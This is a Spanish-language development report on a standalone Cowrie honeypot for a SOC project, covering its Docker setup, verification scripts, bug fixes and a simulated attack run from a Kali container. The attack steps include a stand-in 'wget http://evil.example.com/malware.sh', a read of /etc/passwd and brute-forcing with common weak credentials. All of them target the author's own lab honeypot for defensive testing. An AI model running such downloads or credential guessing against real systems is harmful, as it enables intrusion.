# Memoria de Desarrollo — Honeypot Cowrie
## Proyecto Valhalla SOC

> **Autor:** Santiago Prada  
> **Fecha de inicio:** 2026-04-19  
> **Fecha de cierre:** 2026-05-01  
> **Máquina de desarrollo:** LAPTOP-5E249ONQ (Windows 11)  
> **Repositorio:** github.com/saantiidp/Valhalla-SOC  
> **Rama:** `main`

---

## Índice

1. [Contexto y motivación](#1-contexto-y-motivación)
2. [Arquitectura del honeypot](#2-arquitectura-del-honeypot)
3. [Fases de desarrollo](#3-fases-de-desarrollo)
   - [Fase 1 — Creación del subproyecto standalone](#fase-1--creación-del-subproyecto-standalone)
   - [Fase 2 — Script de verificación automática](#fase-2--script-de-verificación-automática)
   - [Fase 3 — Ciclo de corrección de bugs](#fase-3--ciclo-de-corrección-de-bugs)
   - [Fase 4 — Simulación de ataque automatizada](#fase-4--simulación-de-ataque-automatizada)
   - [Fase 5 — Ataque en vivo con tail de logs](#fase-5--ataque-en-vivo-con-tail-de-logs)
4. [Problemas técnicos y soluciones](#4-problemas-técnicos-y-soluciones)
5. [Evidencias de verificación](#5-evidencias-de-verificación)
6. [Estado final del sistema](#6-estado-final-del-sistema)
7. [Historial de commits](#7-historial-de-commits)

---

## 1. Contexto y motivación

### 1.1 Situación inicial

Al comenzar este desarrollo, Cowrie ya existía en el proyecto Valhalla SOC pero vivía **enterrado dentro del `docker-compose.yml` principal**, junto a Wazuh Indexer, Wazuh Manager, Wazuh Dashboard, PostgreSQL y Ollama. Esto creaba varios problemas:

| Problema | Impacto |
|----------|---------|
| No se podía arrancar Cowrie sin levantar todo el stack Wazuh (~6 GB RAM) | Inviable para desarrollo y pruebas rápidas |
| La configuración (`cowrie_config/`) estaba en la raíz del repo, mezclada | Sin aislamiento, riesgo de pisar la config del compose principal |
| No había documentación específica del honeypot | Nadie del equipo sabía operarlo |
| No había forma de verificar automáticamente que funcionaba | Pruebas manuales lentas y no reproducibles |
| El backend FastAPI no tenía un contrato claro de consumo de logs | Integración futura bloqueada |

### 1.2 Objetivo

Crear `honeypot/` como un **subproyecto completamente independiente** que:

- Se pueda arrancar, parar y probar sin tocar el resto del SOC.
- Tenga su propio `docker-compose.yml`, configuración y scripts.
- Produzca eventos JSON que el backend FastAPI pueda consumir.
- Venga con scripts de verificación automática que generen informes de evidencia.
- Permita simular ataques desde un contenedor Kali Linux de forma reproducible.

### 1.3 Restricción

Ningún fichero preexistente del repo debía ser modificado. El stack monolítico con Wazuh debía seguir funcionando exactamente igual.

---

## 2. Arquitectura del honeypot

### 2.1 Diagrama de componentes

```
                     Internet / LAN
                            │
                   :2222 (SSH)  :2223 (Telnet)
                            │
              ┌─────────────▼─────────────┐
              │       valhalla-cowrie      │  contenedor Docker
              │  imagen: cowrie/cowrie     │  hostname: production-server
              │  banner: OpenSSH 8.9p1     │  512 MB RAM / 0.5 CPU
              └─────────────┬─────────────┘
                            │
          ┌─────────────────┼──────────────────┐
          │                 │                  │
    cowrie.json         cowrie.log        downloads/
    (eventos JSON)      (log humano)      (payloads capturados)
          │
          ▼
    bind-mount → honeypot/logs/
          │
          ▼
    Backend FastAPI  (tail -F → parse → Ollama → API REST)

              ┌─────────────────────┐
              │   valhalla-attacker  │  contenedor Kali Linux
              │  (perfil: labs)      │  conectado a valhalla-net
              └─────────────────────┘
                   │ nmap / ssh / sshpass
                   ▼
              valhalla-cowrie:2222
```

### 2.2 Red Docker

Todos los contenedores comparten la red bridge `valhalla-net`. Esto permite:
- Que el attacker alcance Cowrie por IP interna (`172.18.0.2`) sin pasar por el host.
- Que el backend (cuando se levante) monte el mismo volumen y red sin configuración adicional.

### 2.3 Contrato de datos

El backend consume el fichero `cowrie.json` leyéndolo línea a línea con `tail -F`. Cada línea es un objeto JSON independiente (NDJSON). Los eventos relevantes son:

| `eventid` | Significado |
|-----------|-------------|
| `cowrie.session.connect` | Nueva conexión entrante — IP origen, puerto, sesión |
| `cowrie.login.failed` | Intento fallido — usuario, contraseña, IP |
| `cowrie.login.success` | Login aceptado (trampa activada) — usuario, contraseña |
| `cowrie.command.input` | Comando ejecutado en la shell falsa |
| `cowrie.session.file_download` | El atacante intenta descargar algo (`wget`, `curl`) |
| `cowrie.session.closed` | Fin de sesión — duración |

### 2.4 Credenciales señuelo (`userdb.txt`)

El fichero contiene más de 50 pares `usuario:contraseña` que representan los vectores de ataque más comunes en internet:

- **Bots genéricos**: `root/123456`, `admin/admin`, `test/test`
- **Stacks cloud/dev**: `ubuntu/ubuntu`, `pi/raspberry`, `postgres/postgres`
- **Cuentas CI/CD**: `deploy/deploy`, `git/git`, `jenkins/jenkins`
- **IoT/Mirai-style**: `support/support`, `service/service`, `tech/tech`
- **Wildcard final**: `*:x:*` — acepta cualquier credencial no listada

Esto maximiza la atracción de bots reales y permite capturar los comandos que ejecutan una vez dentro de la shell falsa.

---

## 3. Fases de desarrollo

---

### Fase 1 — Creación del subproyecto standalone

**Commit:** `28d0492` — `feat(honeypot): stack Cowrie standalone con export JSON + docs`  
**Fecha:** 2026-04-19

#### Qué se hizo

Se creó desde cero la carpeta `honeypot/` con la siguiente estructura:

```
honeypot/
├── docker-compose.yml       ← compose standalone (solo Cowrie)
├── Makefile                 ← atajos: up / down / logs / status / test
├── .env.example             ← puertos configurables
├── .gitignore               ← excluye logs/, downloads/, tty/, .env
├── cowrie/
│   ├── cowrie.cfg           ← config con JSON output activado
│   └── userdb.txt           ← 50+ credenciales señuelo
├── logs/.gitkeep
├── downloads/.gitkeep
├── tty/.gitkeep
├── scripts/
│   ├── start.sh
│   ├── stop.sh
│   ├── status.sh
│   ├── tail-logs.sh
│   └── test-attack.sh
└── docs/
    ├── MANUAL.md
    ├── VERIFICACION.md
    └── CHANGELOG.md
```

#### Decisiones de diseño clave

**Bind-mounts en lugar de volúmenes nombrados para logs:**
Los logs se montan directamente en `./logs`, `./downloads`, `./tty` del host. Esto permite inspeccionar los ficheros desde Windows sin entrar al contenedor, lo que simplifica enormemente el desarrollo y la verificación.

**Red con nombre fijo `valhalla-net`:**
La red se declara con `name: valhalla-net` (no con el prefijo automático de Docker Compose) para que el backend pueda unirse a ella con `external: true` sin coordinación adicional.

**Límites de recursos explícitos:**
`512M` de RAM y `0.5` CPU para que el honeypot no interfiera con el resto del sistema en un entorno de desarrollo.

**Healthcheck con `nc -z localhost 2222`:**
Permite saber automáticamente cuándo Cowrie ha terminado de inicializarse y está listo para aceptar conexiones.

#### Resultado

El honeypot arrancaba, pero la verificación formal aún no existía. La siguiente fase la creó.

---

### Fase 2 — Script de verificación automática

**Commits:**
- `73e3167` — `feat(honeypot): verificacion automatica end-to-end`
- `7fdce78` — `fix(honeypot): verify.ps1 en ASCII puro para PowerShell 5.x`
- `76505cd` — `feat(honeypot): preflight check del Docker daemon en verify.ps1`

**Fecha:** 2026-04-19 → 2026-04-20

#### Qué se hizo

Se crearon dos scripts de verificación que cubren el ciclo completo:

**`scripts/verify.ps1`** (Windows PowerShell)  
**`scripts/verify.sh`** (Linux/macOS/WSL)  
**`verificar.bat`** (lanzador de doble click para Windows)

Los scripts ejecutan **15 tests automáticos** en secuencia:

| Test | Qué verifica |
|------|-------------|
| TC-00 | Docker disponible y versión correcta |
| TC-01 | Imagen `cowrie/cowrie:latest` descargable |
| TC-02 | Stack arranca sin errores (`docker compose up -d`) |
| TC-03 | Healthcheck pasa (`healthy`) |
| TC-04 | Puerto SSH 2222 escucha |
| TC-05 | Puerto Telnet 2223 escucha |
| TC-06 | Banner SSH engañoso (`OpenSSH_8.9p1 Ubuntu`) |
| TC-07 | Login con credencial débil aceptado |
| TC-08 | Login con credencial fuerte rechazado |
| TC-09 | Shell falsa responde a comandos (`uname`, `id`, `ls`, `wget`) |
| TC-10 | Eventos aparecen en `cowrie.json` |
| TC-11 | Contador de eventos crece con el tráfico |
| TC-13 | Logs persisten tras un restart del contenedor |
| TC-14 | Bind-mounts `logs/downloads/tty` visibles en el host |
| TC-15 | `cowrie.json` existe y tiene contenido en el host |

Al terminar, generan automáticamente `docs/EVIDENCIA-[fecha].md` con la salida real de cada comando, útil como entregable académico.

#### Problema: PowerShell 5.x y la codificación UTF-8

El primer `verify.ps1` se escribió con caracteres Unicode (tildes, emojis). PowerShell 5.x en Windows no lee UTF-8 sin BOM y rompía el parser al cargar el fichero.

**Solución:** Reescribir el script en **ASCII puro** — sin tildes, sin emojis, sin caracteres fuera del rango 0-127. Todos los mensajes al usuario se simplificaron a ASCII.

#### Problema: `2>NUL` en PowerShell

Al verificar si paramiko estaba instalado se usó `2>NUL` (sintaxis de `cmd.exe`). PowerShell interpreta `NUL` como nombre de fichero literal, no como el dispositivo nulo, y lanza una excepción `FileStream`.

**Solución:** Cambiar `2>NUL` por `2>&1` en todas las redirecciones dentro de `Invoke-Expression`.

#### Primera ejecución real — resultado

```
EVIDENCIA-20260419-212902.md → 3 / 13 tests OK
```

Docker Desktop no estaba corriendo. El script detectó el error pero los tests de conectividad fallaron en cascada. Se añadió un **preflight check explícito** que detecta si el Docker daemon no responde y muestra instrucciones claras al usuario antes de ejecutar ningún test.

---

### Fase 3 — Ciclo de corrección de bugs

Esta fue la fase más larga y técnicamente compleja. Entre el 2026-04-20 y el 2026-04-21 se ejecutaron múltiples rondas de verificación, cada una revelando un problema diferente. A continuación se documenta cada uno en orden cronológico.

---

#### Bug 1 — `exec_command` falla con paramiko 4.0.0

**Commit:** `72eb529` — `fix(honeypot): mini-handshake SSH + tolerar stderr en paramiko check`  
**Síntoma observado:**
```
[FAIL] root:root       -> Channel closed.
[FAIL] root:admin      -> Channel closed.
TOTAL_OK=0
```
TC-07 y TC-09 en KO. Verificación global: **12 / 14**.

**Análisis:**  
El helper `_attack.py` usaba `client.exec_command("uname -a; id; ls /")` para ejecutar comandos en la shell falsa de Cowrie. `paramiko 4.0.0` cambió el ciclo de vida del canal tras `exec_command`: cierra el stream antes de que el cliente lea la salida. Cowrie sí registraba `cowrie.login.success` (auth OK), pero el canal se cerraba antes de emitir `cowrie.command.input`.

**Solución:**  
Reemplazar `exec_command` por `invoke_shell()`:
1. Se abre un canal de shell interactiva, más tolerante y más realista (un bot real entra a la shell, no lanza exec remoto).
2. Se drena el banner/MOTD de Cowrie tras el login.
3. Se mandan los comandos con `chan.send(...)` y se lee la respuesta en un bucle con deadline de 3 segundos.

---

#### Bug 2 — paramiko 4.x es incompatible con Cowrie

**Commit:** `09fed33` — `fix: null-safe paramiko version parse`  
**Síntoma:** El fix anterior con `invoke_shell` tampoco funcionaba. `Channel closed` persistía.

**Análisis:**  
`paramiko 4.0.0` introdujo "4-strict mode": exige features del handshake SSH que Cowrie no implementa. Cuando paramiko abre cualquier canal después del auth, Cowrie cierra la conexión.

Esto no es un bug de Cowrie sino una **incompatibilidad de versión mayor**. `paramiko 3.x` funciona perfectamente con Cowrie.

**Solución:**  
Pinar paramiko a `<4` en ambos scripts de verificación:
```powershell
pip install --quiet "paramiko<4"
```
Si pip ya tiene 4.x instalado, forzar downgrade:
```powershell
pip install --force-reinstall "paramiko<4"
```

---

#### Bug 3 — `fs.pickle` no encontrado (ruta relativa)

**Commit:** `a5a03ca` — `fix(honeypot): ruta ABSOLUTA para cowrie.json + probe global + diag`  
**Síntoma:** Los probes seguían fallando con `Channel closed`. Pero ahora `cowrie.login.success` aparecía en los logs. El problema estaba **después** del login.

**Análisis:**  
`docker logs valhalla-cowrie` mostraba:
```
FileNotFoundError: [Errno 2] No such file or directory: 'share/cowrie/fs.pickle'
SystemExit: 2
```

Cuando paramiko solicita un PTY, Cowrie intenta cargar el fake filesystem desde `share/cowrie/fs.pickle` (ruta relativa). El directorio de trabajo del proceso Cowrie en la imagen actual ya no es `/cowrie/cowrie-git`, por lo que la ruta relativa no resuelve.

**Solución (primer intento):**  
Cambiar a rutas absolutas en `cowrie/cowrie.cfg`:
```ini
[shell]
filesystem = /cowrie/cowrie-git/share/cowrie/fs.pickle
processes  = /cowrie/cowrie-git/share/cowrie/cmdoutput.json
```

---

#### Bug 4 — La ruta `share/cowrie/` no existe en la imagen actual

**Commit:** `76505cd` → `ebd4941`  
**Síntoma:** Tras el fix anterior, el mismo `FileNotFoundError` pero con la ruta absoluta.

**Análisis:**  
La reorganización reciente del repo oficial de Cowrie movió los artefactos de datos de `share/cowrie/` a `src/cowrie/data/`. Confirmado inspeccionando la imagen:
```powershell
docker exec valhalla-cowrie python3 -c "
import os
[print(os.path.join(r,f)) 
 for r,d,fs in os.walk('/cowrie') 
 for f in fs if f.endswith('.pickle')]"
```
Salida:
```
/cowrie/cowrie-git/src/cowrie/data/fs.pickle
```

**Solución definitiva:**
```ini
[shell]
filesystem = /cowrie/cowrie-git/src/cowrie/data/fs.pickle
processes  = /cowrie/cowrie-git/src/cowrie/data/cmdoutput.json
```

---

#### Bug 5 — Bind-mount de logs no funcionaba con la imagen oficial

**Commits:** `771a39d`, `a6934f9`  
**Síntoma:** `cowrie.json` no se creaba en `./logs/` del host.

**Análisis:**  
La imagen `cowrie/cowrie:latest` escribe los logs en `/cowrie/cowrie-git/var/log/cowrie/`. El `docker-compose.yml` inicial montaba `./logs` en una ruta diferente. Además, se intentó usar un `Dockerfile` custom para arreglar permisos, lo que añadía complejidad innecesaria.

**Solución:**  
Bind-mount directo al path real que usa Cowrie:
```yaml
volumes:
  - ./logs:/cowrie/cowrie-git/var/log/cowrie
  - ./downloads:/cowrie/cowrie-git/var/lib/cowrie/downloads
  - ./tty:/cowrie/cowrie-git/var/lib/cowrie/tty
```
En Windows, Docker Desktop permite que cualquier UID dentro del contenedor escriba en bind-mounts. No hace falta Dockerfile custom.

---

#### Bug 6 — Python no disponible en la máquina de desarrollo

**Commit:** `04f4111` — `feat(honeypot): auto-install Python 3.12 via winget`  
**Síntoma:** TC-07 y TC-09 marcados como KO con mensaje "sin python no se ejecutan comandos".

**Solución:**  
El script `verify.ps1` detecta si hay Python disponible probando candidatos en orden:
```
py -3.12, py -3.11, py -3.10, py -3.9, py -3.8, py -3, python, python3
```
Si ninguno está disponible **y** `winget` está instalado, instala Python 3.12 automáticamente:
```powershell
winget install --id Python.Python.3.12 -e --accept-package-agreements --silent
```

---

#### Resultado final de la Fase 3

**Commit:** `ebd4941` — `fix(honeypot): verify 14/14 tras resolver fs.pickle, paramiko y PS redirection`

```
EVIDENCIA-20260421-222844.md → 14 / 14 tests OK
Veredicto: APTO para integración con el backend FastAPI.
```

Todos los bugs resueltos. El script de verificación era completamente fiable y reproducible.

---

### Fase 4 — Simulación de ataque automatizada

**Commit:** `bfe0b6a` — `feat(honeypot): add automated attacker simulation script`  
**Fecha:** 2026-05-01

#### Contexto

Los tests de verificación (`verify.ps1`) probaban el honeypot desde el mismo host. Faltaba el escenario **Attacker → Cowrie por red interna**, que es el más relevante para demostrar la integración completa del SOC.

#### Qué se hizo

Se crearon dos nuevos ficheros:

**`atacar.bat`** — Lanzador de doble click para Windows  
**`scripts/attack_verify.ps1`** — 15 tests automatizados desde el contenedor Kali Linux

El escenario es:
```
[Kali Linux (valhalla-attacker)] ──valhalla-net──► [Cowrie (valhalla-cowrie:172.18.0.2)]
```

Tests implementados:

| Test | Qué verifica |
|------|-------------|
| TC-A0 | Docker daemon corriendo |
| TC-A1 | Cowrie corriendo (lo arranca si no lo está) |
| TC-A2 | IP de Cowrie detectada automáticamente en `valhalla-net` |
| TC-A3 | Attacker (Kali) conectado a `valhalla-net` |
| TC-A4 | Herramientas instaladas en Kali (nmap, ssh, sshpass) |
| TC-A5 | Ping Kali → Cowrie: 0% packet loss |
| TC-A6 | Nmap: puertos 2222 y 2223 `open` |
| TC-A7 | Banner SSH engañoso (`OpenSSH_8.9p1 Ubuntu`) |
| TC-A8 | Login con `root/123456` aceptado |
| TC-A9 | Comandos en shell falsa: `whoami`, `id`, `uname -a`, `ls /` |
| TC-A10 | `wget` y `curl` de malware simulados y registrados |
| TC-A11 | Fuerza bruta con 6 credenciales del `userdb.txt` |
| TC-A12 | Tipos de evento presentes en `cowrie.json` |
| TC-A13 | Contador de eventos > 20 |
| TC-A14 | `cowrie.json` accesible en el host |

#### Problemas encontrados durante el desarrollo

**Problema 1 — Red con prefijo del worktree:**  
Al ejecutar `docker compose --profile labs up -d attacker` desde el worktree (`.claude/worktrees/pensive-heisenberg-8b49a3`), Docker Compose creó `pensive-heisenberg-8b49a3_valhalla-net` en lugar de `valhalla-net`.

**Solución:** Conectar el contenedor manualmente a la red correcta:
```powershell
docker network connect valhalla-net valhalla-attacker
```

**Problema 2 — `nc` no disponible en Kali minimal:**  
TC-A7 usaba `nc` para leer el banner SSH. La imagen `kalilinux/kali-rolling` en su configuración mínima no incluye `netcat`.

**Solución:** Usar el modo verbose de `ssh -v` y grep por `remote software version`:
```sh
ssh -v nobody@IP 2>&1 | grep "remote software"
# → debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
```

**Problema 3 — `sh` no disponible en la imagen Cowrie:**  
TC-A12 y TC-A13 intentaban contar eventos via `docker exec valhalla-cowrie sh -c "wc -l ..."`. La imagen Cowrie no tiene `sh` en el PATH del sistema.

**Solución:** Leer `cowrie.json` directamente desde el bind-mount del host con PowerShell:
```powershell
$lines = Get-Content (Join-Path $HoneypotDir "logs\cowrie.json")
$eventIds = $lines | ForEach-Object {
    try { ($_ | ConvertFrom-Json).eventid } catch {}
}
```

**Resultado:**
```
EVIDENCIA-ATTACK-20260501-191102.md → 15 / 15 tests OK
Veredicto: Simulacion de ataque completada. Todos los eventos fueron capturados.
```

---

### Fase 5 — Ataque en vivo con tail de logs

**Commit:** `b62ff6f` — `feat(honeypot): add live attack simulation with real-time log tail`  
**Fecha:** 2026-05-01

#### Contexto

Los scripts anteriores generaban informes post-ejecución. El equipo necesitaba poder **ver en tiempo real** cómo Cowrie capturaba el tráfico mientras el ataque sucedía — el equivalente a tener `tail -f cowrie.json` abierto mientras se ataca.

#### Qué se hizo

**`atacar-en-vivo.bat`** — Lanzador de doble click  
**`scripts/live_attack.ps1`** — Script que abre dos ventanas simultáneas:

- **Ventana 1 (esta misma):** Ejecuta el ataque paso a paso desde Kali.
- **Ventana 2 (nueva):** `tail -f` de `cowrie.json` con formato coloreado por tipo de evento.

La ventana de logs formatea cada evento con colores según su tipo:

| Color | Tipo de evento |
|-------|---------------|
| 🔵 Cyan | `CONEXION` — nueva IP conectando |
| 🟢 Verde | `LOGIN OK` — credencial aceptada (usuario + contraseña visible) |
| 🔴 Rojo | `LOGIN FAIL` — intento rechazado |
| 🟡 Amarillo | `COMANDO` — comando ejecutado en la shell falsa |
| ⬛ Gris | `SESION CIERRA` — fin de sesión con duración |
| 🟣 Magenta | `DESCARGA` — intento de `wget`/`curl` |

El ataque ejecuta 6 pasos en secuencia con pausas entre ellos para que la ventana de logs tenga tiempo de mostrar cada evento:

```
Paso 1 → ping -c 3 172.18.0.2
Paso 2 → nmap -p 2222,2223 172.18.0.2
Paso 3 → sshpass → ssh root@cowrie 'whoami; id; uname -a'
Paso 4 → sshpass → ssh root@cowrie 'ls /; cat /etc/passwd'
Paso 5 → sshpass → ssh root@cowrie 'wget http://evil.example.com/malware.sh'
Paso 6 → fuerza bruta con 6 credenciales del userdb
```

#### Implementación técnica de la ventana de tail

La ventana de logs se abre con `Start-Process powershell` pasando el script de tail como `EncodedCommand` en Base64. Esto evita problemas de comillas y rutas con espacios en Windows:

```powershell
$tailEncoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes($tailScript)
)
Start-Process powershell -ArgumentList "-EncodedCommand $tailEncoded"
```

#### Problema encontrado — `$ErrorActionPreference = "Stop"` mataba el script

SSH escribe warnings a stderr (`Permanently added... to known hosts`). Con `$ErrorActionPreference = "Stop"`, PowerShell trataba el stderr de `docker exec` como un error terminal y abortaba el script.

**Solución:**
1. Cambiar a `$ErrorActionPreference = "Continue"`.
2. Filtrar los warnings de SSH en la función `Run-Kali` con una lista de patrones:
```powershell
$lines | Where-Object {
    $_ -notmatch "WARNING:|Permanently added|post-quantum|vulnerable"
}
```
3. Añadir `-o LogLevel=ERROR` a todos los comandos SSH para suprimir los warnings en origen.

**Resultado final:** El script abre dos ventanas sincronizadas y ejecuta el ataque completo sin errores ni ruido en la salida.

---

## 4. Problemas técnicos y soluciones

Resumen consolidado de todos los issues encontrados durante el desarrollo:

| # | Problema | Causa raíz | Solución |
|---|----------|-----------|----------|
| 1 | PowerShell 5.x no cargaba el script | Encoding UTF-8 sin BOM | Reescribir en ASCII puro |
| 2 | `2>NUL` causaba excepción FileStream | Sintaxis cmd.exe en PS | Cambiar a `2>&1` |
| 3 | Docker daemon no detectado correctamente | Sin preflight check | Añadir comprobación antes del primer test |
| 4 | `Channel closed` con paramiko | `exec_command` roto en paramiko 4.x | Usar `invoke_shell()` |
| 5 | `Channel closed` persiste con `invoke_shell` | paramiko 4.x incompatible con Cowrie | Pinar a `paramiko<4` |
| 6 | `fs.pickle` no encontrado | Ruta relativa con cwd distinto | Rutas absolutas en cowrie.cfg |
| 7 | `fs.pickle` en ruta absoluta tampoco existe | Reorganización interna de la imagen Cowrie | Ruta correcta: `src/cowrie/data/` |
| 8 | `cowrie.json` no se creaba en el host | Bind-mount a ruta incorrecta | Montar en `/cowrie/cowrie-git/var/log/cowrie` |
| 9 | Python no disponible | Entorno Windows sin Python | Auto-instalar via winget |
| 10 | Red `valhalla-net` con prefijo del worktree | Docker Compose usa el nombre del directorio | `docker network connect valhalla-net` explícito |
| 11 | `nc` no disponible en Kali minimal | Imagen mínima sin netcat | Usar `ssh -v` + grep |
| 12 | `sh` no disponible en imagen Cowrie | Imagen Cowrie no expone shell en PATH | Leer bind-mount desde PowerShell directamente |
| 13 | SSH warnings contaminaban la salida | stderr de docker exec tratado como error PS | `LogLevel=ERROR` + filtro por patrones |
| 14 | Fuerza bruta fallaba silenciosamente | Falta de espacio en concatenación de strings | Fix del espacio antes del username |

---

## 5. Evidencias de verificación

### 5.1 Primera ejecución (estado inicial)

```
Fecha:    2026-04-19 21:29
Informe:  EVIDENCIA-20260419-212902.md
Resultado: 3 / 13 tests OK
Causa:    Docker Desktop no estaba corriendo
```

### 5.2 Evolución durante el ciclo de fixes

| Fecha | Informe | Resultado | Tests nuevos en verde |
|-------|---------|-----------|----------------------|
| 2026-04-20 | EVIDENCIA-20260420-173100.md | 7/14 | TC-01, TC-02, TC-03, TC-04 |
| 2026-04-20 | EVIDENCIA-20260420-175732.md | 10/14 | TC-05, TC-06, TC-13 |
| 2026-04-21 | EVIDENCIA-20260421-220046.md | 12/14 | TC-14, TC-15 |
| 2026-04-21 | EVIDENCIA-20260421-222844.md | **14/14** | TC-07, TC-09 |

### 5.3 Verificación final de honeypot

```
Fecha:    2026-05-01
Informe:  EVIDENCIA-20260501-175546.md
Resultado: 14 / 14 tests OK
Veredicto: APTO para integración con el backend FastAPI
```

Eventos capturados en esa ejecución (extracto del log):
```json
{"eventid":"cowrie.session.connect","src_ip":"127.0.0.1","timestamp":"2026-05-01T17:55:47Z"}
{"eventid":"cowrie.login.success","username":"root","password":"123456","src_ip":"127.0.0.1"}
{"eventid":"cowrie.command.input","input":"uname -a; id; ls /","src_ip":"127.0.0.1"}
{"eventid":"cowrie.session.closed","duration":3.2}
```

### 5.4 Verificación de simulación de ataque (Kali → Cowrie)

```
Fecha:    2026-05-01
Informe:  EVIDENCIA-ATTACK-20260501-191102.md
Resultado: 15 / 15 tests OK
```

Datos destacados del informe:
- **Ping:** 0% packet loss, latencia media 0.094 ms
- **Nmap:** puertos 2222 y 2223 `open`
- **Banner:** `OpenSSH_8.9p1 Ubuntu-3ubuntu0.6`
- **Fuerza bruta:** 6/6 credenciales aceptadas (wildcard `*:x:*` activa)
- **Eventos registrados:** 455 líneas en `cowrie.json`, 249.205 bytes
- **Tipos de evento:** `session.connect` ×58, `login.success` ×48, `command.input` ×44

---

## 6. Estado final del sistema

### 6.1 Ficheros entregados

```
honeypot/
├── docker-compose.yml              ← Stack standalone funcional
├── Makefile                        ← Atajos operacionales
├── .env.example                    ← Configuración de puertos
├── .gitignore                      ← Excluye logs/downloads/tty/.env
├── verificar.bat                   ← Verificación automática (15 tests)
├── atacar.bat                      ← Simulación attacker → cowrie
├── atacar-en-vivo.bat              ← Ataque + tail de logs en tiempo real
├── cowrie/
│   ├── cowrie.cfg                  ← Configuración definitiva (rutas absolutas)
│   └── userdb.txt                  ← 50+ credenciales señuelo
├── scripts/
│   ├── verify.ps1                  ← 15 tests desde el host
│   ├── verify.sh                   ← Equivalente Linux/macOS
│   ├── attack_verify.ps1           ← 15 tests desde Kali
│   ├── live_attack.ps1             ← Ataque + tail en vivo
│   ├── _attack.py                  ← Helper Python para probes SSH
│   ├── start.sh / stop.sh
│   ├── status.sh
│   └── tail-logs.sh
└── docs/
    ├── MANUAL.md
    ├── VERIFICACION.md
    ├── CHANGELOG.md
    ├── EVIDENCIA-ejemplo.md
    ├── EVIDENCIA-*.md              ← 20+ informes generados (gitignored)
    └── MEMORIA_DESARROLLO.md       ← Este documento
```

### 6.2 Comandos de operación

| Acción | Comando |
|--------|---------|
| Arrancar honeypot | `docker compose up -d` (desde `honeypot/`) |
| Verificar 15 tests | `.\verificar.bat` o `powershell -ExecutionPolicy Bypass -File .\scripts\verify.ps1` |
| Simular ataque Kali→Cowrie | `.\atacar.bat` o `powershell -ExecutionPolicy Bypass -File .\scripts\attack_verify.ps1` |
| Ataque en vivo + tail | `.\atacar-en-vivo.bat` o `powershell -ExecutionPolicy Bypass -File .\scripts\live_attack.ps1` |
| Ver logs en tiempo real | `Get-Content -Wait -Tail 20 .\logs\cowrie.json` |
| Entrar en Kali manualmente | `docker exec -it valhalla-attacker /bin/bash` |
| Parar honeypot | `docker compose down` |

### 6.3 Integración con el backend FastAPI

El backend puede consumir los logs montando el mismo volumen o leyendo el bind-mount:

```python
async def tail_cowrie():
    async with aiofiles.open("/var/log/cowrie/cowrie.json") as f:
        await f.seek(0, 2)  # ir al final
        async for line in f:
            event = json.loads(line.strip())
            if event["eventid"] in {
                "cowrie.login.success",
                "cowrie.command.input",
                "cowrie.session.file_download"
            }:
                verdict = await ollama.analyze(event)
                await api.publish(event, verdict)
```

---

## 7. Historial de commits

Todos los commits referentes al honeypot en orden cronológico:

| Commit | Mensaje | Fase |
|--------|---------|------|
| `28d0492` | `feat(honeypot): stack Cowrie standalone con export JSON + docs` | 1 |
| `73e3167` | `feat(honeypot): verificacion automatica end-to-end` | 2 |
| `7fdce78` | `fix(honeypot): verify.ps1 en ASCII puro para PowerShell 5.x` | 2 |
| `76505cd` | `feat(honeypot): preflight check del Docker daemon en verify.ps1` | 2 |
| `9d8c519` | `fix(honeypot): leer cowrie.json via docker exec, no depender del bind-mount` | 3 |
| `72eb529` | `fix(honeypot): mini-handshake SSH + tolerar stderr en paramiko check` | 3 |
| `09fed33` | `fix: null-safe paramiko version parse` | 3 |
| `a5a03ca` | `fix(honeypot): ruta ABSOLUTA para cowrie.json + probe global + diag` | 3 |
| `771a39d` | `fix(honeypot): Dockerfile con permisos correctos sobre /var/log/cowrie` | 3 |
| `a6934f9` | `fix(honeypot): bind-mounts directos al path correcto, sin Dockerfile` | 3 |
| `04f4111` | `feat(honeypot): auto-install Python 3.12 via winget + userdb simplificado` | 3 |
| `ebd4941` | `fix(honeypot): verify 14/14 tras resolver fs.pickle, paramiko y PS redirection` | 3 |
| `bfe0b6a` | `feat(honeypot): add automated attacker simulation script` | 4 |
| `b62ff6f` | `feat(honeypot): add live attack simulation with real-time log tail` | 5 |

---

*Documento generado el 2026-05-28. Autor: Santiago Prada. Proyecto: Valhalla SOC — Máster en Ciberseguridad.*
